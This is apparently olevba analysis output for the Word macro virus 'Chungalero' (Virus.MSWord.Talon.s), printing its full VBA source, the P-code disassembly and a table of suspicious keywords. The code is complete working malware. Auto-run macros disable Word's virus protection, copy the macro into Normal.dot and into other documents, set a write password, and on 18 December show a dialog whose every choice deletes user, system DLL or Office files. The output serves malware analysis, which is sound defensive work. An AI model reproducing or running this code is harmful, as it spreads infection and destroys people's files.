olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Talon.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Talon.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Chungalero.bas 
in file: Virus.MSWord.Talon.s - OLE stream: 'Macros/VBA/Chungalero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
'
' AutoOpen Macro
' ChungaleWare Inc.
' Valledupar, Marzo de 1998.
' Segunda Versión Enero del 1999. V2.01

On Error GoTo Chungalero


    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    

Call EstaInfectadO

Call FaKeJoker

    Application.ScreenUpdating = True
    Application.DisplayAlerts = wdAlertsAll

Chungalero:
End Sub

Private Sub FaKeJoker()
On Error GoTo FaKeError
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll

    Dim Dia, Mes, Hora As Integer
    Dia = Day(Now()): Mes = Month(Now()): Hora = Hour(Now())
    If Dia = 18 And Mes = 12 Then
       Chungale
    End If
    If (Hora >= 12 And Hora <= 14) Or Dia = 18 Then
        Application.ActiveDocument.WritePassword = "Chungalero"
        Opc = 1
        While Opc <> -1
        Set Globito = Assistant.NewBalloon
            With Globito
            .Icon = msoIconTips
            .Heading = "Hola Como Estás?"
            .Text = "Me llaman Chungalero" + Chr$(13) + Chr$(10) _
            + "Hoy Cumplo otro mes de Vida" + Chr$(13) + Chr$(10) + "Si quieres Ayuda!!" + Chr(13) + "llama al 911..." + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10) + "ChungaleWare Inc. Valledupar, Enero 1999"
            .Animation = msoAnimationBeginSpeaking
            .Button = msoBalloonButtonOK
            Opc = .Show
            End With
        Wend
    End If
    
  
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

FaKeError:
End Sub

Private Sub Chungale()
On Error GoTo ChungaleError
Opc = -1
While Opc = -1
Set b = Assistant.NewBalloon
    With b
        .Icon = msoIconAlert
        .Heading = "Chungalero Como Estás?"
        .Text = "Hoy te tocó el Dia Final Selecciona una Opción no te puedes Escapar"
        .Labels(1).Text = "Borrar La Carpeta Mis Documentos"
        .Labels(2).Text = "Borrar los Archivos del Sistema"
        .Labels(3).Text = "Borrar la Carpeta de Archivos de Programas"
        .Animation = msoAnimationBeginSpeaking
        .Button = msoBalloonButtonNull
  Opc = .Show
    End With
  Select Case Opc
    Case 1
        Kill ("c:\Mis Documentos\*.*")
    Case 2
        Kill ("c:\windows\system\*.dll")
    Case 3
        Kill ("c:\Archivos de Programa\Microsoft Office\*.*")
    
    End Select
Wend
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

ChungaleError:
End Sub

Sub AutoClose()
On Error GoTo ErrorClose

    Call AutoOpen

ErrorClose:
End Sub

Sub AutoNew()
On Error GoTo ErrorNew

Call AutoOpen

ErrorNew:
End Sub

Sub AutoExec()
On Error GoTo ErrorExec

Call AutoOpen

ErrorExec:
End Sub

Private Sub EstaInfectadO()
Dim Pname, Cname As String
Dim Esta As Boolean

On Error GoTo DocInfectError
For Projects = 1 To Application.VBE.VbProjects.Count
    Pname = Application.VBE.VbProjects(Projects).Name
    For Component = 2 To Application.VBE.VbProjects(Projects).VBComponents.Count
        Cname = Application.VBE.VbProjects(Projects).VBComponents(Component).Name
        If Application.VBE.VbProjects(Projects).VBComponents(Component).Name = "Chungalero" Then _
           Esta = True
    Next
    If Not Esta And Pname = "Normal" Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Chungalero", _
        Object:=wdOrganizerObjectProjectItems
    End If
    If Not Esta And Pname <> "Normal" And Left(Pname, 5) <> "Virus" Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Chungalero", _
        Object:=wdOrganizerObjectProjectItems
        Application.ActiveDocument.VBProject.Name = "Virus_Chungo" & Trim(Str(Projects))
        
    End If
    Esta = False
Next

DocInfectError:
End Sub

Private Sub scroll(Scrtxt As String)
  ccrtxt = "%Bienvenidos a la página de Fabian Yesith Garcia Jurado, para comentarios y sugerencias envieme e-mail a gulfasith@geocities.com%"
  Lentxt = Len(Scrtxt)
  Widthscr = Lentxt
  pos = 1 - Widthscr
  counte = 1
While counte < Lentxt
  pos = pos + 1
  scroller = ""
  If pos = Lentxt Then
    pos = 1 - Widthscr
  End If
  If (pos < 0) Then
    PosAbs = Abs(pos)
    For i = 1 To PosAbs
      scroller = scroller + " "
    Next
    scroller = scroller + Mid(Scrtxt, 1, Widthscr - i + 1)
  Else
    pos = pos + 2
    scroller = scroller + Mid(Scrtxt, pos, Widthscr)
  End If
  Application.Caption = scroller
  counte = counte + 1
  DoEvents
  For m = 1 To 2000000
  Next
Wend
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Talon.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Chungalero - 14706 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x000F " AutoOpen Macro"
' Line #4:
' 	QuoteRem 0x0000 0x0012 " ChungaleWare Inc."
' Line #5:
' 	QuoteRem 0x0000 0x001B " Valledupar, Marzo de 1998."
' Line #6:
' 	QuoteRem 0x0000 0x0026 " Segunda Versión Enero del 1999. V2.01"
' Line #7:
' Line #8:
' 	OnError Chungalero 
' Line #9:
' Line #10:
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #12:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #13:
' Line #14:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' 	ArgsCall (Call) EstaInfectadO 0x0000 
' Line #20:
' Line #21:
' 	ArgsCall (Call) FaKeJoker 0x0000 
' Line #22:
' Line #23:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #24:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #25:
' Line #26:
' 	Label Chungalero 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub FaKeJoker())
' Line #30:
' 	OnError FaKeError 
' Line #31:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #32:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #33:
' Line #34:
' 	Dim 
' 	VarDefn Dia
' 	VarDefn Mes
' 	VarDefn Hora (As Integer)
' Line #35:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St Dia 
' 	BoS 0x0000 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	St Mes 
' 	BoS 0x0000 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St Hora 
' Line #36:
' 	Ld Dia 
' 	LitDI2 0x0012 
' 	Eq 
' 	Ld Mes 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #37:
' 	ArgsCall Chungale 0x0000 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld Hora 
' 	LitDI2 0x000C 
' 	Ge 
' 	Ld Hora 
' 	LitDI2 0x000E 
' 	Le 
' 	And 
' 	Paren 
' 	Ld Dia 
' 	LitDI2 0x0012 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000A "Chungalero"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt WritePassword 
' Line #41:
' 	LitDI2 0x0001 
' 	St Opc 
' Line #42:
' 	Ld Opc 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ne 
' 	While 
' Line #43:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set Globito 
' Line #44:
' 	StartWithExpr 
' 	Ld Globito 
' 	With 
' Line #45:
' 	Ld msoIconTips 
' 	MemStWith Icon 
' Line #46:
' 	LitStr 0x0010 "Hola Como Estás?"
' 	MemStWith Heading 
' Line #47:
' 	LineCont 0x0004 0E 00 0C 00
' 	LitStr 0x0014 "Me llaman Chungalero"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001B "Hoy Cumplo otro mes de Vida"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0012 "Si quieres Ayuda!!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "llama al 911..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0028 "ChungaleWare Inc. Valledupar, Enero 1999"
' 	Add 
' 	MemStWith Then 
' Line #48:
' 	Ld msoAnimationBeginSpeaking 
' 	MemStWith Animation 
' Line #49:
' 	Ld msoBalloonButtonOK 
' 	MemStWith Button 
' Line #50:
' 	MemLdWith Show 
' 	St Opc 
' Line #51:
' 	EndWith 
' Line #52:
' 	Wend 
' Line #53:
' 	EndIfBlock 
' Line #54:
' Line #55:
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #57:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #58:
' Line #59:
' 	Label FaKeError 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Private Sub Chungale())
' Line #63:
' 	OnError ChungaleError 
' Line #64:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Opc 
' Line #65:
' 	Ld Opc 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	While 
' Line #66:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set B 
' Line #67:
' 	StartWithExpr 
' 	Ld B 
' 	With 
' Line #68:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #69:
' 	LitStr 0x0016 "Chungalero Como Estás?"
' 	MemStWith Heading 
' Line #70:
' 	LitStr 0x0043 "Hoy te tocó el Dia Final Selecciona una Opción no te puedes Escapar"
' 	MemStWith Then 
' Line #71:
' 	LitStr 0x0020 "Borrar La Carpeta Mis Documentos"
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Labels 0x0001 
' 	MemSt Then 
' Line #72:
' 	LitStr 0x001F "Borrar los Archivos del Sistema"
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Labels 0x0001 
' 	MemSt Then 
' Line #73:
' 	LitStr 0x002A "Borrar la Carpeta de Archivos de Programas"
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Labels 0x0001 
' 	MemSt Then 
' Line #74:
' 	Ld msoAnimationBeginSpeaking 
' 	MemStWith Animation 
' Line #75:
' 	Ld msoBalloonButtonNull 
' 	MemStWith Button 
' Line #76:
' 	MemLdWith Show 
' 	St Opc 
' Line #77:
' 	EndWith 
' Line #78:
' 	Ld Opc 
' 	SelectCase 
' Line #79:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #80:
' 	LitStr 0x0015 "c:\Mis Documentos\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #81:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #82:
' 	LitStr 0x0017 "c:\windows\system\*.dll"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #83:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #84:
' 	LitStr 0x002C "c:\Archivos de Programa\Microsoft Office\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #85:
' Line #86:
' 	EndSelect 
' Line #87:
' 	Wend 
' Line #88:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #89:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #90:
' Line #91:
' 	Label ChungaleError 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub AutoClose())
' Line #95:
' 	OnError ErrorClose 
' Line #96:
' Line #97:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #98:
' Line #99:
' 	Label ErrorClose 
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' 	FuncDefn (Sub AutoNew())
' Line #103:
' 	OnError ErrorNew 
' Line #104:
' Line #105:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #106:
' Line #107:
' 	Label ErrorNew 
' Line #108:
' 	EndSub 
' Line #109:
' Line #110:
' 	FuncDefn (Sub AutoExec())
' Line #111:
' 	OnError ErrorExec 
' Line #112:
' Line #113:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #114:
' Line #115:
' 	Label ErrorExec 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Private Sub EstaInfectadO())
' Line #119:
' 	Dim 
' 	VarDefn Pname
' 	VarDefn Cname (As String)
' Line #120:
' 	Dim 
' 	VarDefn Esta (As Boolean)
' Line #121:
' Line #122:
' 	OnError DocInfectError 
' Line #123:
' 	StartForVariable 
' 	Ld Projects 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VbProjects 
' 	MemLd Count 
' 	For 
' Line #124:
' 	Ld Projects 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VbProjects 0x0001 
' 	MemLd New 
' 	St Pname 
' Line #125:
' 	StartForVariable 
' 	Ld Component 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld Projects 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VbProjects 0x0001 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #126:
' 	Ld Component 
' 	Ld Projects 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VbProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St Cname 
' Line #127:
' 	LineCont 0x0004 13 00 0B 00
' 	Ld Component 
' 	Ld Projects 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VbProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "Chungalero"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Esta 
' 	EndIf 
' Line #128:
' 	StartForVariable 
' 	Next 
' Line #129:
' 	Ld Esta 
' 	Not 
' 	Ld Pname 
' 	LitStr 0x0006 "Normal"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #130:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Chungalero"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Ld Esta 
' 	Not 
' 	Ld Pname 
' 	LitStr 0x0006 "Normal"
' 	Ne 
' 	And 
' 	Ld Pname 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Virus"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #133:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Chungalero"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #134:
' 	LitStr 0x000C "Virus_Chungo"
' 	Ld Projects 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #135:
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	LitVarSpecial (False)
' 	St Esta 
' Line #138:
' 	StartForVariable 
' 	Next 
' Line #139:
' Line #140:
' 	Label DocInfectError 
' Line #141:
' 	EndSub 
' Line #142:
' Line #143:
' 	FuncDefn (Private Sub scroll(Scrtxt As String))
' Line #144:
' 	LitStr 0x0081 "%Bienvenidos a la página de Fabian Yesith Garcia Jurado, para comentarios y sugerencias envieme e-mail a gulfasith@geocities.com%"
' 	St ccrtxt 
' Line #145:
' 	Ld Scrtxt 
' 	FnLen 
' 	St Lentxt 
' Line #146:
' 	Ld Lentxt 
' 	St Widthscr 
' Line #147:
' 	LitDI2 0x0001 
' 	Ld Widthscr 
' 	Sub 
' 	St pos 
' Line #148:
' 	LitDI2 0x0001 
' 	St counte 
' Line #149:
' 	Ld counte 
' 	Ld Lentxt 
' 	Lt 
' 	While 
' Line #150:
' 	Ld pos 
' 	LitDI2 0x0001 
' 	Add 
' 	St pos 
' Line #151:
' 	LitStr 0x0000 ""
' 	St scroller 
' Line #152:
' 	Ld pos 
' 	Ld Lentxt 
' 	Eq 
' 	IfBlock 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld Widthscr 
' 	Sub 
' 	St pos 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	Ld pos 
' 	LitDI2 0x0000 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #156:
' 	Ld pos 
' 	FnAbs 
' 	St PosAbs 
' Line #157:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PosAbs 
' 	For 
' Line #158:
' 	Ld scroller 
' 	LitStr 0x0001 " "
' 	Add 
' 	St scroller 
' Line #159:
' 	StartForVariable 
' 	Next 
' Line #160:
' 	Ld scroller 
' 	Ld Scrtxt 
' 	LitDI2 0x0001 
' 	Ld Widthscr 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St scroller 
' Line #161:
' 	ElseBlock 
' Line #162:
' 	Ld pos 
' 	LitDI2 0x0002 
' 	Add 
' 	St pos 
' Line #163:
' 	Ld scroller 
' 	Ld Scrtxt 
' 	Ld pos 
' 	Ld Widthscr 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St scroller 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	Ld scroller 
' 	Ld Application 
' 	MemSt Caption 
' Line #166:
' 	Ld counte 
' 	LitDI2 0x0001 
' 	Add 
' 	St counte 
' Line #167:
' 	ArgsCall DoEvents 0x0000 
' Line #168:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x8480 0x001E 
' 	For 
' Line #169:
' 	StartForVariable 
' 	Next 
' Line #170:
' 	Wend 
' Line #171:
' 	EndSub 
' Line #172:
' Line #173:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

